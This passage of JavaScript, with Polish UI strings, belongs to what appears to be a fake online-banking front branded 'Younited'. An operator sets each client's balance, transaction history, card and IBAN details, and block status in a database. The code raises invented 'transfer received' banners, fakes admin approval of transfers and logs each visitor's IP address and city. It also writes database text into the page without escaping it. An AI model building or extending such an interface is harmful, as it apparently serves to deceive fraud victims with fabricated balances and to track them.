    nameEl.textContent = data.nom;
    nameEl.style.display = 'block';
  }
  if (data.theme && themes[data.theme]) {
    applyTheme(data.theme);
    localStorage.setItem('Younited_theme', data.theme);
  }
  applyBgColor(data.bgColor || 'gray');
  if (window.__clientIdFromUrl) {
    const cacheKey = 'Younited_client_cache_' + window.__clientIdFromUrl;
    localStorage.setItem(cacheKey, JSON.stringify({
      nom: data.nom || '',
      theme: data.theme || 'teal',
      timestamp: Date.now()
    }));
  }
  if (data.blocked) {
    showLogin();
    showBlockedMsg();
    return;
  }
  showLogin();
  hideBlockedMsg();
}

if (window.__clientIdFromUrl) {
  onValue(ref(db, 'clients/' + window.__clientIdFromUrl), (snap) => {
    const data = snap.val();
    if (!data) {
      localStorage.removeItem('Younited_session');
      localStorage.removeItem('Younited_session_id');
      localStorage.removeItem('Younited_client_id');
      showBanned();
      return;
    }
    updateClientDisplay(data);
    if (data.blocked) {
      showBlockedMsg();
      if (localStorage.getItem('Younited_session')) {
        localStorage.removeItem('Younited_session');
        localStorage.removeItem('Younited_session_id');
        localStorage.removeItem('Younited_client_id');
        if (user) {
          user = null;
          if (historyListener) historyListener();
          if (balanceListener) balanceListener();
          if (statusListener) statusListener();
          if (banqueRef) banqueRef();
          clearBannerTimer();
        }
        show('login');
      }
    } else {
      hideBlockedMsg();
    }
  });

  if (!localStorage.getItem('Younited_session')) {
    showLoading('Weryfikacja konta...');
    get(ref(db, 'clients/' + window.__clientIdFromUrl)).then((snap) => {
      const data = snap.val();
      hideLoading();

      if (!data) {
        showBanned();
        return;
      }

      updateClientDisplay(data);

      if (data.blocked) {
        showBlockedMsg();
        show('login');
      } else {
        hideBlockedMsg();
        show('login');
      }

      const newUrl = new URL(window.location.href);
      newUrl.searchParams.set('nom', encodeURIComponent(data.nom || ''));
      newUrl.searchParams.set('theme', encodeURIComponent(data.theme || 'teal'));
      window.history.replaceState({}, '', newUrl.toString());

    }).catch(() => {
      hideLoading();
      show('login');
    });
  }
} else if (!localStorage.getItem('Younited_session')) {
  show('login');
}

// ===== FORMAT DE MONNAIE =====
function normalizeDevise(dev) {
  if (!dev) return 'PLN';
  var d = String(dev).trim().toUpperCase();
  if (d === 'ZŁ' || d === 'PLN') return 'PLN';
  if (d === 'EUR' || d === '€') return 'EUR';
  if (d === 'USD' || d === '$' || d === '$') return 'USD';
  if (d === 'ILS' || d === '₪') return 'ILS';
  return d;
}

function getDeviseSymbol(code) {
  if (code === 'PLN') return 'zł';
  if (code === 'EUR') return '€';
  if (code === 'USD') return '$';
  if (code === 'ILS') return '₪';
  return code;
}

function getDeviseLabel(code) {
  if (code === 'PLN') return 'PLN (zł)';
  if (code === 'EUR') return 'EUR (€)';
  if (code === 'USD') return 'USD ($)';
  if (code === 'ILS') return 'ILS (₪)';
  return code;
}

const fmt = (n) => {
  const devCode = normalizeDevise((user && user.devise) ? user.devise : 'zł');
  const sym = getDeviseSymbol(devCode);
  const num = Number(n) || 0;
  const parts = num.toFixed(2).split('.');
  let intPart = parts[0];
  const reversed = intPart.split('').reverse().join('');
  const groups = reversed.match(/.{1,3}/g);
  const spaced = groups.join(' ').split('').reverse().join('');
  return spaced + ',' + parts[1] + ' ' + sym;
};

function adjustFontSize(element, baseSize, maxChars, minSize) {
  if (!element) return;
  requestAnimationFrame(() => {
    const text = element.textContent || '';
    const container = element.parentElement;
    if (!container) return;
    const containerWidth = container.clientWidth - 10;
    const avgCharWidth = baseSize * 0.55;
    const maxCharsLocal = maxChars || Math.floor(containerWidth / avgCharWidth);
    let newSize = baseSize;
    if (text.length > maxCharsLocal) {
      newSize = Math.max(minSize || 10, baseSize * (maxCharsLocal / text.length));
    }
    element.style.fontSize = newSize + 'px';
  });
}

function adjustGreetingFontSize() {
  const greetSpan = document.querySelector('#greet span');
  if (greetSpan) {
    const container = document.getElementById('greet');
    if (container) {
      const containerWidth = container.clientWidth - 80;
      const baseSize = 18;
      const avgCharWidth = baseSize * 0.55;
      const maxChars = Math.floor(containerWidth / avgCharWidth);
      adjustFontSize(greetSpan, baseSize, maxChars, 12);
    }
  }
}

function adjustBalanceFontSize(element) {
  if (!element) return;
  const text = element.textContent || '';
  const container = element.parentElement;
  if (!container) return;
  const containerWidth = container.clientWidth - 40;
  const baseSize = 24;
  const avgCharWidth = baseSize * 0.55;
  const maxChars = Math.floor(containerWidth / avgCharWidth);
  adjustFontSize(element, baseSize, maxChars, 10);
}

function adjustStatFontSize(element) {
  if (!element) return;
  const text = element.textContent || '';
  const container = element.parentElement;
  if (!container) return;
  const containerWidth = container.clientWidth - 20;
  const baseSize = 20;
  const avgCharWidth = baseSize * 0.55;
  const maxChars = Math.floor(containerWidth / avgCharWidth);
  adjustFontSize(element, baseSize, maxChars, 11);
}

function adjustAllTexts() {
  adjustGreetingFontSize();
  const bal = document.getElementById('bal');
  if (bal) adjustBalanceFontSize(bal);
  document.querySelectorAll('.stat-value').forEach(el => adjustStatFontSize(el));
}

function updateBalanceDisplay(balanceElement, statElement, amount) {
  const formatted = fmt(amount);
  if (balanceElement) {
    balanceElement.textContent = formatted;
    adjustBalanceFontSize(balanceElement);
  }
  if (statElement) {
    statElement.textContent = formatted;
    adjustStatFontSize(statElement);
  }
  adjustAllTexts();
}

// ===== DONNÉES BANCAIRES =====
function updateBankData(data) {
  if (!data) return;
  document.getElementById('ibanOwner').textContent = data.ibanOwner || 'KWIATKOWSKI PW';
  document.getElementById('ibanNumber').textContent = data.iban || 'LT15 2339 1465 189X XXXX';
  document.getElementById('ibanBic').textContent = data.ibanBic || 'TTQGLTIJCJK';
  document.getElementById('ibanBank').textContent = data.ibanBank || 'Younited Finance';
  const holder = data.carteHolder || 'JAN KOWALSKI';
  const numRaw = data.carteNumero || '455655188867XXXX';
  const num = numRaw.replace(/\s/g, '');
  const exp = data.carteExpiry || '02/28';
  const cvv = data.carteCvv || '556';
  const detailNumEl = document.getElementById('cardDetailNumber');
  const detailCvvEl = document.getElementById('cardDetailCvv');
  detailNumEl.dataset.realNumber = num;
  detailCvvEl.dataset.realCvv = cvv;
  document.getElementById('cardHolderName').textContent = holder;
  document.getElementById('cardDetailHolder').textContent = holder;
  document.getElementById('cardExpiry').textContent = exp;
  document.getElementById('cardDetailExpiry').textContent = exp;
  document.getElementById('cardCvv').textContent = '***';
  document.getElementById('cardDetailCvv').textContent = '***';
  const p1 = num.substring(0,4), p2 = num.substring(4,8), p3 = num.substring(8,12);
  document.getElementById('cardNumber').innerHTML = `<span>${p1}</span><span>${p2}</span><span>${p3}</span><span>XXXX</span>`;
  detailNumEl.textContent = `${p1} ${p2} ${p3} XXXX`;
}

function setupBankListener(userId) {
  if (banqueRef) banqueRef();
  banqueRef = onValue(ref(db, 'clients/' + userId + '/banque'), (snapshot) => {
    const data = snapshot.val();
    updateBankData(data);
  });
}

// ===== SESSIONS =====
async function getPublicIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip || 'Inconnue';
  } catch {
    return 'Inconnue';
  }
}

async function getCountryInfo() {
  try {
    const res = await fetch('https://ipwho.is/');
    const data = await res.json();
    if (data.success) {
      return {
        country: data.country,
        countryCode: data.country_code,
        countryFlag: data.flag && data.flag.emoji ? data.flag.emoji : '🌐',
        city: data.city
      };
    }
  } catch (e) {
    console.error('Erreur géolocalisation:', e);
  }
  return { country: 'Inconnu', countryCode: 'XX', countryFlag: '🌐', city: '' };
}

function getDeviceName() {
  const ua = navigator.userAgent;
  if (ua.includes('iPhone')) return 'iPhone';
  if (ua.includes('Android')) return 'Android';
  if (ua.includes('Windows')) return 'Windows PC';
  if (ua.includes('Mac')) return 'Mac';
  if (ua.includes('Linux')) return 'Linux';
  return 'Appareil inconnu';
}

async function updateSession(connected = true) {
  if (!user || !user._id) return;
  const ip = await getPublicIP();
  const countryInfo = await getCountryInfo();
  const device = getDeviceName();
  const now = Date.now();

  const storedSessionId = localStorage.getItem('Younited_session_id');
  if (storedSessionId) {
    const sessionSnap = await get(ref(db, 'clients/' + user._id + '/sessions/' + storedSessionId));
    if (sessionSnap.exists()) {
      await update(ref(db, 'clients/' + user._id + '/sessions/' + storedSessionId), {
        connected: connected,
        lastActivity: now,
        ip: ip,
        device: device,
        country: countryInfo.country,
        countryCode: countryInfo.countryCode,
        countryFlag: countryInfo.countryFlag,
        city: countryInfo.city
      });
      sessionId = storedSessionId;
      return;
    }
  }

  const newSessionRef = push(ref(db, 'clients/' + user._id + '/sessions'));
  const newSessionId = newSessionRef.key;
  await set(newSessionRef, {
    device: device,
    ip: ip,
    connected: connected,
    lastActivity: now,
    created: now,
    country: countryInfo.country,
    countryCode: countryInfo.countryCode,
    countryFlag: countryInfo.countryFlag,
    city: countryInfo.city
  });
  localStorage.setItem('Younited_session_id', newSessionId);
  sessionId = newSessionId;
}

async function refreshSession() {
  if (user && user._id && sessionId) {
    const ip = await getPublicIP();
    const countryInfo = await getCountryInfo();
    await update(ref(db, 'clients/' + user._id + '/sessions/' + sessionId), {
      lastActivity: Date.now(),
      ip: ip,
      country: countryInfo.country,
      countryCode: countryInfo.countryCode,
      countryFlag: countryInfo.countryFlag,
      city: countryInfo.city
    });
  }
}

// ===== HISTORIQUE =====
function getSenderName(tx) {
  return tx.sender || tx.senderName || tx.beneficiary || tx.subtitle || tx.from || tx.nadawca || 'Nieznany nadawca';
}

// ===== VRAIS LOGOS DES BANQUES POLONAISES =====
const BANK_LOGOS = {
  // ===== FAVICONS OFFICIELS GOOGLE (SOURCE LA PLUS FIABLE) =====
  // sz=256 demande la meilleure résolution disponible sur le site officiel
  'mbank':       { img: 'https://www.google.com/s2/favicons?domain=mbank.pl&sz=256',            name: 'mBank',           color: '#C41230', bg: '#FEE2E2' },
  'pko':         { img: 'https://www.google.com/s2/favicons?domain=pkobp.pl&sz=256',            name: 'PKO BP',          color: '#003087', bg: '#DBEAFE' },
  'ing':         { img: 'https://www.google.com/s2/favicons?domain=ing.pl&sz=256',              name: 'ING',             color: '#FF6600', bg: '#FFEDD5' },
  'santander':   { img: 'https://www.google.com/s2/favicons?domain=santander.pl&sz=256',        name: 'Santander',       color: '#EC0000', bg: '#FEE2E2' },
  'pekao':       { img: 'https://www.google.com/s2/favicons?domain=pekao.com.pl&sz=256',        name: 'Pekao',           color: '#1D4F91', bg: '#DBEAFE' },
  'millennium':  { img: 'https://www.google.com/s2/favicons?domain=millennium.pl&sz=256',       name: 'Millennium',      color: '#8B1D41', bg: '#FCE7F3' },
  'alior':       { img: 'https://www.google.com/s2/favicons?domain=aliorbank.pl&sz=256',        name: 'Alior',           color: '#00A651', bg: '#D1FAE5' },
  'bnpparibas':  { img: 'https://www.google.com/s2/favicons?domain=bnpparibas.pl&sz=256',       name: 'BNP',             color: '#008737', bg: '#D1FAE5' },
  'creditagricole': { img: 'https://www.google.com/s2/favicons?domain=credit-agricole.pl&sz=256', name: 'CA',            color: '#007E4A', bg: '#D1FAE5' },
  'citi':        { img: 'https://www.google.com/s2/favicons?domain=citibank.pl&sz=256',         name: 'Citi',            color: '#003B70', bg: '#DBEAFE' },
  'bos':         { img: 'https://www.google.com/s2/favicons?domain=bosbank.pl&sz=256',          name: 'BOŚ',             color: '#006341', bg: '#D1FAE5' },
  'getin':       { img: 'https://www.google.com/s2/favicons?domain=getinbank.pl&sz=256',        name: 'Getin',           color: '#0055A4', bg: '#DBEAFE' },
  'idea':        { img: 'https://www.google.com/s2/favicons?domain=ideabank.pl&sz=256',         name: 'Idea',            color: '#FDB913', bg: '#FEF3C7' },
  'nest':        { img: 'https://www.google.com/s2/favicons?domain=nestbank.pl&sz=256',         name: 'Nest',            color: '#E3001B', bg: '#FEE2E2' },
  'pocztowy':    { img: 'https://www.google.com/s2/favicons?domain=bankpocztowy.pl&sz=256',     name: 'Pocztowy',        color: '#D52B1E', bg: '#FEE2E2' },
  'sgb':         { img: 'https://www.google.com/s2/favicons?domain=sgb.pl&sz=256',              name: 'SGB',             color: '#005A9C', bg: '#DBEAFE' },
  'velo':        { img: 'https://www.google.com/s2/favicons?domain=velobank.pl&sz=256',         name: 'Velo',            color: '#6A0DAD', bg: '#F3E8FF' },
  'noble':       { img: 'https://www.google.com/s2/favicons?domain=getinbank.pl&sz=256',        name: 'Noble',           color: '#1A1A1A', bg: '#E5E7EB' },
  'eurobank':    { img: 'https://www.google.com/s2/favicons?domain=eurobank.pl&sz=256',         name: 'Eurobank',        color: '#0055A4', bg: '#DBEAFE' },
  'raiffeisen':  { img: 'https://www.google.com/s2/favicons?domain=raiffeisen.pl&sz=256',       name: 'Raiffeisen',      color: '#FFDC00', bg: '#FEF9C3' },
  'toyota':      { img: 'https://www.google.com/s2/favicons?domain=toyotabank.pl&sz=256',       name: 'Toyota',          color: '#EB0A1E', bg: '#FEE2E2' },
  'volkswagen':  { img: 'https://www.google.com/s2/favicons?domain=vwbank.pl&sz=256',           name: 'VW Bank',         color: '#001E50', bg: '#DBEAFE' },
  'sberbank':    { img: 'https://www.google.com/s2/favicons?domain=sberbank.ru&sz=256',         name: 'Sberbank',        color: '#1D8F3C', bg: '#D1FAE5' },
  'inteligo':    { img: 'https://www.google.com/s2/favicons?domain=inteligo.pl&sz=256',         name: 'Inteligo',        color: '#FF6600', bg: '#FFEDD5' },
  'orange':      { img: 'https://www.google.com/s2/favicons?domain=orange.pl&sz=256',           name: 'Orange',          color: '#FF6600', bg: '#FFEDD5' },
  'alior_sync':  { img: 'https://www.google.com/s2/favicons?domain=aliorbank.pl&sz=256',        name: 'Alior Sync',      color: '#00A651', bg: '#D1FAE5' },
  'bph':         { img: 'https://www.google.com/s2/favicons?domain=bph.pl&sz=256',              name: 'BPH',             color: '#0055A4', bg: '#DBEAFE' },
  'bgz':         { img: 'https://www.google.com/s2/favicons?domain=bgz.pl&sz=256',              name: 'BGŻ',             color: '#00843D', bg: '#D1FAE5' },
  'paribas':     { img: 'https://www.google.com/s2/favicons?domain=bnpparibas.pl&sz=256',       name: 'Paribas',         color: '#008737', bg: '#D1FAE5' },
  'aig':         { img: 'https://www.google.com/s2/favicons?domain=aig.com&sz=256',             name: 'AIG',             color: '#003B70', bg: '#DBEAFE' }
};

function stringToColor(str) {
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    hash = str.charCodeAt(i) + ((hash << 5) - hash);
  }
  const colors = [
    'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
    'linear-gradient(135deg, #f093fb 0%, #f5576c 100%)',
    'linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)',
    'linear-gradient(135deg, #43e97b 0%, #38f9d7 100%)',
    'linear-gradient(135deg, #fa709a 0%, #fee140 100%)',
    'linear-gradient(135deg, #30cfd0 0%, #330867 100%)',
    'linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%)',
    'linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%)',
    'linear-gradient(135deg, #a8edea 0%, #fed6e3 100%)',
    'linear-gradient(135deg, #ff8a80 0%, #ea6100 100%)'
  ];
  const index = Math.abs(hash) % colors.length;
  return colors[index];
}

function getBankLogo(tx) {
  if (tx.senderBank && tx.senderBank !== 'custom' && BANK_LOGOS[tx.senderBank]) {
    return { ...BANK_LOGOS[tx.senderBank], isBank: true };
  }
  // Banque personnalisée ou inconnue : avatar professionnel avec initiales
  const name = tx.senderName || tx.subtitle || tx.sender || 'Bank';
  return { img: null, name: name, isBank: false, isCustom: true };
}

function renderHistory(historyArray) {
  const list = document.getElementById('history-list');
  list.innerHTML = '';
  let count = 0;

  if (!historyArray || historyArray.length === 0) {
    list.innerHTML = `<div class="empty-history"><i class="fa-regular fa-receipt"></i> Brak transakcji</div>`;
    document.getElementById('stat-tx').textContent = 0;
    document.getElementById('tx-count-badge').textContent = 0;
    return;
  }

  const getTransactionTime = (item) => {
    if (item.timestamp && typeof item.timestamp === 'number') return item.timestamp;
    if (item.date && item.time) {
      const parts = item.date.split('.');
      if (parts.length === 3) {
        const day = parseInt(parts[0], 10);
        const month = parseInt(parts[1], 10) - 1;
        const year = parseInt(parts[2], 10);
        const timeParts = item.time.split(':');
        const hours = parseInt(timeParts[0], 10);
        const minutes = parseInt(timeParts[1], 10);
        return new Date(year, month, day, hours, minutes).getTime();
      }
    }
    return 0;
  };

  const getTransactionDate = (item) => {
    const ts = getTransactionTime(item);
    if (ts) {
      const d = new Date(ts);
      return { day: d.getDate(), month: d.getMonth(), year: d.getFullYear() };
    }
    if (item.date) {
      const parts = item.date.split('.');
      if (parts.length === 3) {
        return { day: parseInt(parts[0], 10), month: parseInt(parts[1], 10) - 1, year: parseInt(parts[2], 10) };
      }
    }
    return null;
  };

  const today = new Date();
  const todayDate = { day: today.getDate(), month: today.getMonth(), year: today.getFullYear() };
  const yesterday = new Date(today); yesterday.setDate(yesterday.getDate() - 1);
  const yesterdayDate = { day: yesterday.getDate(), month: yesterday.getMonth(), year: yesterday.getFullYear() };

  const formatDateLabel = (txDate) => {
    if (!txDate) return 'Inna data';
    if (txDate.day === todayDate.day && txDate.month === todayDate.month && txDate.year === todayDate.year) return 'Dzisiaj';
    if (txDate.day === yesterdayDate.day && txDate.month === yesterdayDate.month && txDate.year === yesterdayDate.year) return 'Wczoraj';
    const months = ['stycznia','lutego','marca','kwietnia','maja','czerwca','lipca','sierpnia','września','października','listopada','grudnia'];
    return `${txDate.day} ${months[txDate.month]} ${txDate.year}`;
  };

  const sorted = [...historyArray].sort((a, b) => getTransactionTime(b) - getTransactionTime(a));
  count = sorted.length;

  // Grouper par date
  const groups = {};
  sorted.forEach(d => {
    const txDate = getTransactionDate(d);
    const label = formatDateLabel(txDate);
    if (!groups[label]) groups[label] = [];
    groups[label].push(d);
  });

  const groupOrder = ['Dzisiaj', 'Wczoraj'];
  const otherLabels = Object.keys(groups).filter(l => !groupOrder.includes(l));
  otherLabels.sort((a, b) => {
    const aTx = groups[a][0];
    const bTx = groups[b][0];
    return getTransactionTime(bTx) - getTransactionTime(aTx);
  });
  const allLabels = [...groupOrder.filter(l => groups[l]), ...otherLabels];

  allLabels.forEach((label, groupIndex) => {
    // En-tête de groupe
    const groupHeader = document.createElement('div');
    groupHeader.className = 'history-group-header';
    groupHeader.innerHTML = `<span>${label}</span>`;
    list.appendChild(groupHeader);

    groups[label].forEach((d, index) => {
      const card = document.createElement('div');
      card.className = 'history-item';
      card.setAttribute('data-id', d.id);
      card.style.animationDelay = `${index * 0.04}s`;

      const pos = d.amount >= 0;
      const isRefund = pos && d.title === 'Zwrot';
      let displayTitle = d.title;
      let displaySubtitle = d.subtitle;
      let iconClass = '';
      let amountClass = '';
      let iconHtml = '';

      if (d.status === 'pending') {
        displayTitle = 'Przelew w oczekiwaniu';
        iconClass = 'refund';
        amountClass = 'refund';
        iconHtml = `<div style="width:44px;height:44px;border-radius:14px;background:linear-gradient(135deg,#FEF3C7,#FDE68A);display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(217,119,6,0.15);"><i class="fa-solid fa-clock" style="color:#D97706;font-size:16px;"></i></div>`;
      } else if (d.status === 'cancelled') {
        displayTitle = 'Przelew anulowany';
        iconClass = 'debit';
        amountClass = 'debit';
        iconHtml = `<div style="width:44px;height:44px;border-radius:14px;background:linear-gradient(135deg,#FEE2E2,#FECACA);display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(220,38,38,0.15);"><i class="fa-solid fa-ban" style="color:#DC2626;font-size:16px;"></i></div>`;
      } else if (isRefund) {
        displayTitle = 'Zwrot środków';
        iconClass = 'refund';
        amountClass = 'refund';
        iconHtml = `<div style="width:44px;height:44px;border-radius:14px;background:linear-gradient(135deg,#EDE9FE,#DDD6FE);display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(124,58,237,0.15);"><i class="fa-solid fa-rotate-left" style="color:#7C3AED;font-size:16px;"></i></div>`;
      } else if (pos) {
        const logo = getBankLogo(d);
        if (logo.isBank && logo.img) {
          iconClass = 'credit bank-logo';
          iconHtml = `<div class="bank-logo-wrap"><img src="${logo.img}" alt="${logo.name}" onerror="this.style.display='none';this.parentElement.innerHTML='<div class=\'bank-fallback\' style=\'background:${logo.bg};color:${logo.color};\'>${logo.name.substring(0,2).toUpperCase()}</div>';"></div>`;
        } else if (logo.isCustom) {
          iconClass = 'credit custom-bank';
          const initials = logo.name.split(' ').map(w => w[0]).join('').substring(0, 2).toUpperCase();
          const bgGradient = stringToColor(logo.name);
          iconHtml = `<div style="width:44px;height:44px;border-radius:14px;background:${bgGradient};color:#fff;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:800;box-shadow:0 2px 8px rgba(0,0,0,0.12);text-shadow:0 1px 2px rgba(0,0,0,0.25);letter-spacing:0.5px;border:2px solid rgba(255,255,255,0.3);">${initials}</div>`;
        } else {
          iconClass = 'credit human-logo';
          iconHtml = `<div style="width:44px;height:44px;border-radius:14px;background:linear-gradient(135deg,#D1FAE5,#A7F3D0);display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(5,150,105,0.12);"><i class="fa-solid fa-arrow-down" style="color:#059669;font-size:16px;"></i></div>`;
        }
        amountClass = 'credit';
      } else {
        iconClass = 'debit';
        amountClass = 'debit';
        iconHtml = `<div class="tx-avatar-debit"><i class="fa-solid fa-user"></i></div>`;
      }

      const subtitleText = displaySubtitle ? displaySubtitle : (pos ? 'Przelew otrzymany' : 'Przelew wysłany');
      const timeText = d.time || '';

      card.innerHTML = `
        <div class="history-left">
          <div class="history-icon ${iconClass}">${iconHtml}</div>
          <div class="history-info">
            <div class="title">${displayTitle}</div>
            <div class="subtitle">${subtitleText}</div>
            <div class="meta">${timeText}</div>
          </div>
        </div>
        <div class="history-amount-col">
          <div class="history-amount ${amountClass}">${pos ? '+' : '-'}${fmt(Math.abs(d.amount))}</div>
          <div class="history-status">${pos ? 'Zrealizowany' : 'Zrealizowany'}</div>
        </div>
      `;
      card.onclick = () => showTxDetail(d);
      list.appendChild(card);
    });
  });

  document.getElementById('stat-tx').textContent = count;
  document.getElementById('tx-count-badge').textContent = count;
}

function genId(prefix) {
  return prefix + Math.floor(1000000000 + Math.random() * 9000000);
}

function addDebitHistory(data) {
  if (!data.amount || data.amount >= 0) return Promise.resolve();
  if (!data.id) data.id = genId('DE');
  const { dateStr, timeStr, timestamp } = getPolandDateTime();
  if (!data.time || !data.timestamp) {
    data.time = timeStr;
    data.timestamp = timestamp;
  }
  if (!data.date) data.date = dateStr;
  if (user && user._id) {
    console.log('📤 Ajout de la transaction de débit:', data);
    return push(ref(db, 'clients/' + user._id + '/history'), data)
      .then(() => {
        console.log('✅ Transaction de débit enregistrée avec succès');
        return data;
      })
      .catch(err => {
        console.error('❌ Erreur push débit:', err);
        return null;
      });
  } else {
    console.warn('⚠️ user._id manquant, impossible d\'ajouter la transaction');
    return Promise.resolve(null);
  }
}

function getNotifiedCreditIds(userId) {
  const key = `Younited_notified_credits_${userId}`;
  try {
    const stored = localStorage.getItem(key);
    return stored ? JSON.parse(stored) : [];
  } catch {
    return [];
  }
}

function setNotifiedCreditIds(userId, ids) {
  const key = `Younited_notified_credits_${userId}`;
  localStorage.setItem(key, JSON.stringify(ids));
}

async function handleNewCreditTransaction(tx, userId) {
  if (!tx || tx.amount <= 0) return;
  if (tx.title === 'Zwrot') return;

  const notifiedIds = getNotifiedCreditIds(userId);
  if (notifiedIds.includes(tx.id)) return;

  const montantFormatted = fmt(tx.amount);
  const beneficiaire = getSenderName(tx);
  const nomClient = user.nom || 'Klient';
  const bannerMsg = `Witam ${nomClient}, Otrzymałeś przelew od ${beneficiaire} na kwotę ${montantFormatted}.`;

  console.log('📢 Génération de bannière pour crédit:', bannerMsg);

  try {
    await update(ref(db, 'clients/' + userId), { bannerMessage: '', bannerRead: true });
    await update(ref(db, 'clients/' + userId), { bannerMessage: bannerMsg, bannerRead: false });
    user.bannerMessage = bannerMsg;
    user.bannerRead = false;
    updateBanner();

    notifiedIds.push(tx.id);
    setNotifiedCreditIds(userId, notifiedIds);
    console.log('✅ Bannière de crédit générée et transaction marquée');
  } catch (e) {
    console.error('❌ Erreur lors de la génération de la bannière de crédit:', e);
  }
}

async function initHistoryListener(userId) {
  if (historyListener) historyListener();
  try {
    const snapshot = await get(ref(db, 'clients/' + userId + '/history'));
    if (snapshot.exists()) {
      const val = snapshot.val();
      const arr = Object.values(val);
      currentHistory = arr;
      renderHistory(arr);
    } else {
      currentHistory = [];
      renderHistory([]);
    }
  } catch (err) {
    console.error('Erreur chargement historique:', err);
    renderHistory([]);
  }

  historyListener = onValue(ref(db, 'clients/' + userId + '/history'), (snap) => {
    const val = snap.val();
    let arr = [];
    if (val) {
      arr = Object.values(val);
      currentHistory = arr;
      renderHistory(arr);

      const notifiedIds = getNotifiedCreditIds(userId);
      const newCredits = arr.filter(tx => tx.amount > 0 && tx.title !== 'Zwrot' && !notifiedIds.includes(tx.id));
      if (newCredits.length > 0) {
        newCredits.forEach(tx => {
          handleNewCreditTransaction(tx, userId);
        });
      }
    } else {
      currentHistory = [];
      renderHistory([]);
    }
  });
}

// ===== SURVEILLANCE SOLDE =====
function watchBalance(userId) {
  if (balanceListener) balanceListener();
  balanceListener = onValue(ref(db, 'clients/' + userId + '/montant'), (snap) => {
    const newMontant = snap.val();
    if (newMontant === null || newMontant === undefined) return;
    user.montant = Number(newMontant);
    const balElement = document.getElementById('bal');
    const statBalElement = document.getElementById('stat-balance');
    updateBalanceDisplay(balElement, statBalElement, user.montant);
    document.getElementById('bal2').textContent = fmt(user.montant);
    updateProfileInfo();
  });
}

// ===== SURVEILLANCE STATUT =====
function watchClientStatus(userId) {
  if (statusListener) statusListener();
  statusListener = onValue(ref(db, 'clients/' + userId), (snap) => {
    const data = snap.val();
    if (!data) {
      toast('Konto usunięte');
      setTimeout(() => forceLogout(true), 1500);
      return;
    }
    if (data.blocked) {
      toast('Konto zablokowane');
      setTimeout(() => forceLogout(false), 1000);
      return;
    }
    if (data.historyReset) {
      const key = 'Younited_' + user.email.toLowerCase();
      const stored = JSON.parse(localStorage.getItem(key) || '{}');
      if (!stored.lastReset || data.historyReset > stored.lastReset) {
        localStorage.setItem(key, JSON.stringify({ montant: 0, history: [], lastReset: data.historyReset }));
        user.montant = 0;
        const balElement = document.getElementById('bal');
        const statBalElement = document.getElementById('stat-balance');
        updateBalanceDisplay(balElement, statBalElement, 0);
        document.getElementById('bal2').textContent = fmt(0);
        updateProfileInfo();
        toast('Historia i saldo zresetowane');
      }
      return;
    }
    const oldTheme = user.theme;
    const oldNom = user.nom;
    user.pct = data.pct;
    user.code = data.code;
    user.refundCode = data.refundCode || '';
    user.msg = data.msg;
    user.pays = data.pays;
    user.adresse = data.adresse;
    user.tel = data.tel;
    user.devise = data.devise || 'zł';
    user.notification = data.notification || '';
    user.theme = data.theme || 'teal';
    user.nom = data.nom || user.nom;
    user.email = data.email || user.email;
    
    user.bannerMessage = data.bannerMessage || '';
    user.bannerRead = data.bannerRead || false;
    updateBanner();
    const bgColor = data.bgColor || 'gray';
    applyBgColor(bgColor);
    
    if (oldNom !== user.nom) {
      const greetEl = document.getElementById('greet');
      if (greetEl) {
        greetEl.innerHTML = `Witaj, <span>${user.nom}</span>`;
        adjustGreetingFontSize();
      }
    }
    if (oldTheme !== user.theme) {
      applyTheme(user.theme);
      document.querySelectorAll('.btn').forEach(btn => btn.style.background = 'var(--p)');
    }
    // Gérer les virements en attente (approbation/annulation admin) – notifications locales uniquement
    user.pendingTransferConfig = data.pendingTransferConfig || { enabled: false };
    const pts = data.pendingTransfers || {};
    const prevPts = user._pendingTransfers || {};

    for (const [ptId, pt] of Object.entries(pts)) {
      const prevPt = prevPts[ptId];
      if (!prevPt) continue;

      // APPROBATION détectée – notification locale uniquement (solde/historique/bannière gérés par l'admin)
      if (pt.status === 'approved' && prevPt.status === 'pending') {
        toast('✅ Przelew zatwierdzony przez administrację i wysłany');
      }

      // ANNULATION détectée – notification locale uniquement (solde/historique/bannière gérés par l'admin)
      if (pt.status === 'cancelled' && prevPt.status === 'pending') {
        toast('❌ Przelew anulowany przez administrację. Kwota zwrócona.');
      }
    }

    user._pendingTransfers = JSON.parse(JSON.stringify(pts));
    user.pendingTransfer = data.pendingTransfer || { active: false };
    user.pendingTransferConfig = data.pendingTransferConfig || { enabled: false };

    updateAvatars();
    updateCurrency();
    updateNotifBadge();
    updateProfileInfo();
    adjustAllTexts();
  });
}

// ===== FONCTIONS BANNIÈRE =====
function updateBanner() {
  const container = document.getElementById('banner-container');
  const textEl = document.getElementById('bannerText');
  if (!container || !textEl) return;
  
  clearBannerTimer();
  
  if (user && user.bannerMessage && user.bannerMessage.trim() !== '' && !user.bannerRead) {
    textEl.innerHTML = user.bannerMessage;
    container.style.display = 'block';
    console.log('📢 Bannière affichée');
    
    if (user && user._id) {
      bannerTimer = setTimeout(async () => {
        console.log('⏰ Fermeture automatique de la bannière après 5 minutes');
        await closeBanner(true);
      }, 5 * 60 * 1000);
    }
  } else {
    container.style.display = 'none';
    console.log('📢 Bannière masquée');
  }
}

function clearBannerTimer() {
  if (bannerTimer) {
    clearTimeout(bannerTimer);
    bannerTimer = null;
    console.log('⏹️ Timer de bannière annulé');
  }
}

window.closeBanner = async function(auto = false) {
  if (!user || !user._id) return;
  try {
    if (!auto) {
      await update(ref(db, 'clients/' + user._id), { bannerRead: true });
      user.bannerRead = true;
    } else {
      await update(ref(db, 'clients/' + user._id), { bannerRead: true });
      user.bannerRead = true;
    }
    clearBannerTimer();
    updateBanner();
    if (auto) {
      console.log('🤖 Bannière fermée automatiquement après 5 minutes');
    } else {
      console.log('❌ Bannière fermée par le client');
    }
  } catch (e) {
    console.error('Erreur fermeture bannière:', e);
  }
};

// ===== RAFRAÎCHISSEMENT =====
window.refreshData = async function(silent = true) {
